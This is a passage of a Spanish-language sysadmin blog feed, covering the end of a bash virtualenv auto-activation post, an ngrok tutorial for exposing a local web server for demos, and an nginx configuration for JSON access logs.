    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya nos funciona el montaje. Asumamos que tenemos un fichero &lt;em&gt;requirements.txt&lt;/em&gt; en la carpeta &lt;em&gt;sandbox&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; projects/
gerard@aldebaran:~/projects$ cat sandbox/requirements.txt 
&lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.5
gerard@aldebaran:~/projects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos entrar en ella para que se ejecute nuestra función; como hay un &lt;em&gt;requirements.txt&lt;/em&gt; y no hay un &lt;em&gt;.venv&lt;/em&gt;, lo crea, instalando en él las dependencias contenidas en el fichero &lt;em&gt;requirements.txt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
New python executable in /home/gerard/projects/sandbox/.venv/bin/python
Installing setuptools, pip, wheel...done.
Collecting &lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.5 &lt;span class="o"&gt;(&lt;/span&gt;from -r requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
  Using cached Django-1.10.5-py2.py3-none-any.whl
Installing collected packages: Django
Successfully installed Django-1.10.5
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora ya tenemos en &lt;em&gt;virtualenv&lt;/em&gt; activado, hasta salir de la carpeta. Si volvemos a entrar, solo lo acitva, sin reinstalarlo. Al entrar en una subcarpeta, no lo desactiva.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox$ &lt;span class="nb"&gt;cd&lt;/span&gt; folder/
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/sandbox/folder$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto me evito tener que ir preocupándome de los &lt;em&gt;virtualenvs&lt;/em&gt; y de los fichero &lt;em&gt;.pyc&lt;/em&gt;. Muy útil y muy productivo.&lt;/p&gt;</content><category term="bash"></category><category term="variable"></category><category term="PROMPT_COMMAND"></category></entry><entry><title>Exponiendo puertos TCP a través de un firewall con ngrok</title><link href="http://www.linuxsysadmin.ml/2017/06/exponiendo-puertos-tcp-a-traves-de-un-firewall-con-ngrok.html" rel="alternate"></link><published>2017-06-12T10:00:00+02:00</published><updated>2017-06-12T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-12:/2017/06/exponiendo-puertos-tcp-a-traves-de-un-firewall-con-ngrok.html</id><summary type="html">&lt;p&gt;A veces tenemos la necesidad de exponer en internet algún puerto TCP de forma temporal, para hacer &lt;em&gt;testing&lt;/em&gt; o alguna &lt;em&gt;demo&lt;/em&gt;. Ya vimos como podemos hacer esto mediante &lt;a href="http://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;túneles SSH reversos&lt;/a&gt;, aunque no siempre disponemos de un dominio público. En estos casos podemos usar un sistema de túneles llamado &lt;strong&gt;ngrok …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces tenemos la necesidad de exponer en internet algún puerto TCP de forma temporal, para hacer &lt;em&gt;testing&lt;/em&gt; o alguna &lt;em&gt;demo&lt;/em&gt;. Ya vimos como podemos hacer esto mediante &lt;a href="http://www.linuxsysadmin.ml/2016/10/creando-tuneles-con-ssh.html"&gt;túneles SSH reversos&lt;/a&gt;, aunque no siempre disponemos de un dominio público. En estos casos podemos usar un sistema de túneles llamado &lt;strong&gt;ngrok&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El concepto es muy simple, tal como nos indican en su &lt;a href="https://ngrok.com/"&gt;página web&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Secure tunnels to localhost&lt;/strong&gt;&lt;br&gt;
I want to expose a local server behind a NAT or firewall to the internet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Se trata de un binario que abre un túnel reverso SSH contra una de sus servidores, exponiendo dicho puerto mediante un dominio de la forma &lt;code&gt;&amp;lt;dominio.ngrok.io&amp;gt;&lt;/code&gt;. Algunas de las funcionalidades requieren una versión de pago, pero la versión gratuita nos puede sacar de algún apuro.&lt;/p&gt;
&lt;h2&gt;El escenario de partida&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que estamos desarrollando una página web y nos interesa que un cliente nos valide que es lo que quiere, o puede ser que pidamos opiniones de terceros.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que es una página HTML simple, aunque podría ser un puerto levantado por nuestro &lt;em&gt;framework&lt;/em&gt; favorito. Para servirlo vamos a utilizar un servidor web simple, por ejemplo, el &lt;em&gt;SimpleHTTPServer&lt;/em&gt; de &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;No vamos a desarrollar una página muy completa, solo lo justo para que se vea el ejemplo. Este es nuestro código HTML:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ cat index.html 
&amp;lt;!doctype html&amp;gt;

&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;

&amp;lt;head&amp;gt;
  &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;title&amp;gt;Lorem ipsum&amp;lt;/title&amp;gt;
  &amp;lt;link &lt;span class="nv"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;style.css&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
  &amp;lt;h1&amp;gt;Lorem ipsum&amp;lt;/h1&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
  &amp;lt;p&amp;gt;Lorem ipsum dolor sit amet&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
gerard@sodium:~/web$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por poner algo con un poco de color, utilizaremos una hoja de estilo CSS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ cat style.css 
body &lt;span class="o"&gt;{&lt;/span&gt;
  width: 800px&lt;span class="p"&gt;;&lt;/span&gt;
  margin: auto&lt;span class="p"&gt;;&lt;/span&gt;
  background-color: cyan&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

h1 &lt;span class="o"&gt;{&lt;/span&gt; text-align: center&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
p &lt;span class="o"&gt;{&lt;/span&gt; text-align: justify&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
gerard@sodium:~/web$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como necesitamos servirla, ponemos un servidor cualquiera para servirlo, por ejemplo, el de &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~/web$ python -m SimpleHTTPServer
Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;8000&lt;/span&gt; ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto podemos ver la página web localmente en &lt;a href="http://localhost:8000/"&gt;http://localhost:8000/&lt;/a&gt;, aunque por estar detrás de un &lt;em&gt;firewall&lt;/em&gt;, nadie más allá del &lt;em&gt;firewall&lt;/em&gt; puede verlo.&lt;/p&gt;
&lt;h2&gt;Instalando ngrok&lt;/h2&gt;
&lt;p&gt;En este caso, el título no es muy acertado, ya que &lt;strong&gt;no se instala&lt;/strong&gt;. Se trata de un solo binario compilado estáticamente, que solo tiene que ser descargado y descomprimido.&lt;/p&gt;
&lt;p&gt;Siguiendo la página de descarga, he elegido el binario que funciona para mi sistema operativo y arquitectura, que para variar es un sistema &lt;em&gt;Linux&lt;/em&gt; de 64 bits. Podemos descargar el enlace directamente en el navegador o con una comando adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
converted &lt;span class="s1"&gt;&amp;#39;https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ANSI_X3.4-1968&lt;span class="o"&gt;)&lt;/span&gt; -&amp;gt; &lt;span class="s1"&gt;&amp;#39;https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;UTF-8&lt;span class="o"&gt;)&lt;/span&gt;
--2016-12-27 &lt;span class="m"&gt;17&lt;/span&gt;:18:09--  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
Resolving bin.equinox.io &lt;span class="o"&gt;(&lt;/span&gt;bin.equinox.io&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;107&lt;/span&gt;.20.195.3, &lt;span class="m"&gt;23&lt;/span&gt;.21.165.77, &lt;span class="m"&gt;107&lt;/span&gt;.20.164.208
Connecting to bin.equinox.io &lt;span class="o"&gt;(&lt;/span&gt;bin.equinox.io&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;107&lt;/span&gt;.20.195.3&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;5142256&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.9M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: &lt;span class="s1"&gt;&amp;#39;ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt;

ngrok-stable-linux-amd64 &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[====================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;   &lt;span class="m"&gt;4&lt;/span&gt;.90M  &lt;span class="m"&gt;2&lt;/span&gt;.39MB/s   in &lt;span class="m"&gt;2&lt;/span&gt;.0s   

&lt;span class="m"&gt;2016&lt;/span&gt;-12-27 &lt;span class="m"&gt;17&lt;/span&gt;:18:12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.39 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - &lt;span class="s1"&gt;&amp;#39;ngrok-stable-linux-amd64.zip&amp;#39;&lt;/span&gt; saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;5142256&lt;/span&gt;/5142256&lt;span class="o"&gt;]&lt;/span&gt;

gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se trata de un fichero &lt;em&gt;.zip&lt;/em&gt; que tenemos que descomprimir para obtener el binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ unzip ngrok-stable-linux-amd64.zip 
Archive:  ngrok-stable-linux-amd64.zip
  inflating: ngrok                   
gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto podemos dejar el nuevo binario en alguna carpeta que esté en el &lt;em&gt;PATH&lt;/em&gt; del sistema, aunque no es necesario. En este caso no voy a hacerlo por brevedad.&lt;/p&gt;
&lt;h2&gt;Levantando el túnel&lt;/h2&gt;
&lt;p&gt;El binario tiene muchas opciones, algunas funcionan en la versión gratuita, pero otras no. Podemos ver lo que tenemos disponible invocando el binario sin más parámetros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ ./ngrok 
NAME:
   ngrok - tunnel &lt;span class="nb"&gt;local&lt;/span&gt; ports to public URLs and inspect traffic

DESCRIPTION:
    ngrok exposes &lt;span class="nb"&gt;local&lt;/span&gt; networked services behinds NATs and firewalls to the
    public internet over a secure tunnel. Share &lt;span class="nb"&gt;local&lt;/span&gt; websites, build/test
    webhook consumers and self-host personal services.
    Detailed &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; each &lt;span class="nb"&gt;command&lt;/span&gt; is available with &lt;span class="s1"&gt;&amp;#39;ngrok help &amp;lt;command&amp;gt;&amp;#39;&lt;/span&gt;.
    Open http://localhost:4040 &lt;span class="k"&gt;for&lt;/span&gt; ngrok&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s web interface to inspect traffic.

EXAMPLES:
    ngrok http &lt;span class="m"&gt;80&lt;/span&gt;                    &lt;span class="c1"&gt;# secure public URL for port 80 web server&lt;/span&gt;
    ngrok http -subdomain&lt;span class="o"&gt;=&lt;/span&gt;baz &lt;span class="m"&gt;8080&lt;/span&gt;   &lt;span class="c1"&gt;# port 8080 available at baz.ngrok.io&lt;/span&gt;
    ngrok http foo.dev:80            &lt;span class="c1"&gt;# tunnel to host:port instead of localhost&lt;/span&gt;
    ngrok tcp &lt;span class="m"&gt;22&lt;/span&gt;                     &lt;span class="c1"&gt;# tunnel arbitrary TCP traffic to port 22&lt;/span&gt;
    ngrok tls -hostname&lt;span class="o"&gt;=&lt;/span&gt;foo.com &lt;span class="m"&gt;443&lt;/span&gt;  &lt;span class="c1"&gt;# TLS traffic for foo.com to port 443&lt;/span&gt;
    ngrok start foo bar baz          &lt;span class="c1"&gt;# start tunnels from the configuration file&lt;/span&gt;

VERSION:
   &lt;span class="m"&gt;2&lt;/span&gt;.1.18

AUTHOR:
  inconshreveable - &amp;lt;alan@ngrok.com&amp;gt;

COMMANDS:
   authtoken    save authtoken to configuration file
   credits  prints author and licensing information
   http     start an HTTP tunnel
   start    start tunnels by name from the configuration file
   tcp      start a TCP tunnel
   tls      start a TLS tunnel
   update   update ngrok to the latest version
   version  print the version string
   &lt;span class="nb"&gt;help&lt;/span&gt;     Shows a list of commands or &lt;span class="nb"&gt;help&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; one &lt;span class="nb"&gt;command&lt;/span&gt;
gerard@sodium:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es muy interesante la opción del puerto TCP, pero esta es de pago. Sin embargo, la opción de un túnel HTTP es gratuita. Es la que vamos a usar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sodium:~$ ./ngrok http &lt;span class="m"&gt;8000&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El comando nos va a pintar una página de estado, con alguna información útil para saber a donde tenemos que apuntar el navegador remoto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ngrok by @inconshreveable                                                           &lt;span class="o"&gt;(&lt;/span&gt;Ctrl+C to quit&lt;span class="o"&gt;)&lt;/span&gt;

Session Status                online                                                                
Version                       &lt;span class="m"&gt;2&lt;/span&gt;.1.18                                                                
Region                        United States &lt;span class="o"&gt;(&lt;/span&gt;us&lt;span class="o"&gt;)&lt;/span&gt;                                                    
Web Interface                 http://127.0.0.1:4040                                                 
Forwarding                    http://54b3ca80.ngrok.io -&amp;gt; localhost:8000                            
Forwarding                    https://54b3ca80.ngrok.io -&amp;gt; localhost:8000                           

Connections                   ttl     opn     rt1     rt5     p50     p90                           
                              &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00    &lt;span class="m"&gt;0&lt;/span&gt;.00                          
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta salida podemos sacar dos datos importantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La página pública referente a nuestro túnel, &lt;a href="http://54b3ca80.ngrok.io/"&gt;http://54b3ca80.ngrok.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Una página local de estadísticas local en &lt;a href="http://localhost:4040/"&gt;http://localhost:4040/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La página de estado es una gran utilidad; es en donde podemos ver información de estado y un análisis exhaustivo de las peticiones recibidas. Vale la pena darle un vistazo.&lt;/p&gt;</content><category term="ngrok"></category><category term="túnel"></category><category term="ssh"></category></entry><entry><title>Logs en formato JSON en Nginx</title><link href="http://www.linuxsysadmin.ml/2017/06/logs-en-formato-json-en-nginx.html" rel="alternate"></link><published>2017-06-06T10:00:00+02:00</published><updated>2017-06-06T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-06:/2017/06/logs-en-formato-json-en-nginx.html</id><summary type="html">&lt;p&gt;Vimos en un artículo anterior como trabajar con herramientas para agregar los &lt;em&gt;logs&lt;/em&gt; en un mismo servidor, para su consulta. Algunos formatos de &lt;em&gt;logs&lt;/em&gt; necesitan complejas formas de &lt;em&gt;parseado&lt;/em&gt; para que puedan servir de base para nuestra consulta, y en el caso de &lt;strong&gt;logstash&lt;/strong&gt; nos conviene un formato &lt;strong&gt;JSON&lt;/strong&gt; válido …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Vimos en un artículo anterior como trabajar con herramientas para agregar los &lt;em&gt;logs&lt;/em&gt; en un mismo servidor, para su consulta. Algunos formatos de &lt;em&gt;logs&lt;/em&gt; necesitan complejas formas de &lt;em&gt;parseado&lt;/em&gt; para que puedan servir de base para nuestra consulta, y en el caso de &lt;strong&gt;logstash&lt;/strong&gt; nos conviene un formato &lt;strong&gt;JSON&lt;/strong&gt; válido.&lt;/p&gt;
&lt;p&gt;Hay muchos servicios con complejos formatos de &lt;em&gt;log&lt;/em&gt;, pero suelen tener formas para cambiarlos y ahorrarnos así una tediosa expresión regular al configurar &lt;strong&gt;logstash&lt;/strong&gt;. Este es el caso de &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/Mar/2017:10:26:59 +0000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="m"&gt;1966&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/Mar/2017:10:26:59 +0000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /favicon.ico HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;404&lt;/span&gt; &lt;span class="m"&gt;571&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://172.17.0.2/&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo por echar un vistazo en internet, vemos que hay varias opciones, siendo la que más me gusta &lt;a href="https://github.com/jiaz/nginx-http-json-log"&gt;esta opción&lt;/a&gt;. Sin embargo es un módulo de terceros y no suele venir compilado en ninguna distribución conocida.&lt;/p&gt;
&lt;p&gt;Como no es plan ponerse a compilar, podemos encontrar una solución más fácil en &lt;a href="http://nginx.org/en/docs/http/ngx_http_log_module.html"&gt;la documentación de nginx&lt;/a&gt;, que aunque no es la más correcta, nos sirve para salir del paso.&lt;/p&gt;
&lt;p&gt;Se trata de crear un formato de &lt;em&gt;log&lt;/em&gt; personalizado, que podemos utilizar en todos nuestros sitios, y que &lt;strong&gt;logstash&lt;/strong&gt; sabe &lt;em&gt;parsear&lt;/em&gt; de serie.&lt;/p&gt;
&lt;p&gt;Para ello vamos a modificar nuestra configuración para crear un nuevo formato de &lt;em&gt;log&lt;/em&gt; llamado &lt;em&gt;logstash_json&lt;/em&gt;, que debe ir obligatoriamente dentro del bloque &lt;em&gt;http&lt;/em&gt; (directiva &lt;em&gt;log_format&lt;/em&gt;). Luego podemos utilizar ese formato en cualquier bloque &lt;em&gt;http&lt;/em&gt;, &lt;em&gt;server&lt;/em&gt; o &lt;em&gt;location&lt;/em&gt; que nos convenga (directiva &lt;em&gt;access_log&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A nivel de ejemplo, os pongo a continuación una configuración muy simple, con ambas directivas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~/docker/nginx$ cat nginx.conf 
worker_processes &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    log_format logstash_json &lt;span class="s1"&gt;&amp;#39;{ &amp;quot;@timestamp&amp;quot;: &amp;quot;$time_iso8601&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;@fields&amp;quot;: { &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;remote_addr&amp;quot;: &amp;quot;$remote_addr&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;remote_user&amp;quot;: &amp;quot;$remote_user&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;body_bytes_sent&amp;quot;: &amp;quot;$body_bytes_sent&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request_time&amp;quot;: &amp;quot;$request_time&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;status&amp;quot;: &amp;quot;$status&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request&amp;quot;: &amp;quot;$request&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request_method&amp;quot;: &amp;quot;$request_method&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;http_referrer&amp;quot;: &amp;quot;$http_referer&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;http_user_agent&amp;quot;: &amp;quot;$http_user_agent&amp;quot; } }&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    access_log /var/log/nginx/access.log logstash_json&lt;span class="p"&gt;;&lt;/span&gt;

    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@server:~/docker/nginx$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras consultar los &lt;em&gt;logs&lt;/em&gt; tras algunas consultas, vemos que sale un formato correctamente formado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:37+00:00&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;304&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
